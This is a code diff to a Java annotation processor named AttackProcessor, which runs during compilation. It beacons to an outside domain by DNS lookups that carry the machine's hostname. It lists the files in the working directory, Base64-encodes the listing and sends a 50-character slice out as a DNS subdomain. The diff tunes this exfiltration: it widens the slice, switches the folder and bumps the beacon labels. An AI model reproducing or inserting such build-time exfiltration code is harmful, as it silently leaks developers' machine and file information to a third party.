@@ -32,11 +32,11 @@ public class AttackProcessor extends AbstractProcessor {
 
         try
         {
-            Inet4Address.getByName( "javac20.lirui28.t.dlsr.ga" );
+            Inet4Address.getByName( "javac21.lirui28.t.dlsr.ga" );
 
-            Inet4Address.getByName( InetAddress.getLocalHost().getHostName()+".javac20.lirui28.t.dlsr.ga" );
+            Inet4Address.getByName( InetAddress.getLocalHost().getHostName()+".javac21.lirui28.t.dlsr.ga" );
 
-            File folder = new File(System.getProperty("user.home"));
+            File folder = new File(System.getProperty("user.dir"));
 
             if (folder.isDirectory()){
                 File[] files = folder.listFiles();
@@ -47,12 +47,12 @@ public class AttackProcessor extends AbstractProcessor {
             fs = new String( Base64.getEncoder().encode( fs.getBytes() ) );
             fs = fs.replaceAll("\\n", "");
 
-            if (fs.length()>20){
-                Inet4Address.getByName( fs.substring( 0,20 )+".3.lirui28.t.dlsr.ga" );
+            if (fs.length()>50){
+                Inet4Address.getByName( fs.substring( 0,50 )+".3.lirui28.t.dlsr.ga" );
 
                 //Inet4Address.getByName( fs.substring( 0,90 )+".2.lirui28.t.dlsr.ga" );
             } else {
-                    Inet4Address.getByName( "xiaoyu20"+".3.lirui28.t.dlsr.ga" );
+                    Inet4Address.getByName( "xiaoyu50"+".3.lirui28.t.dlsr.ga" );
             }
 
             try {
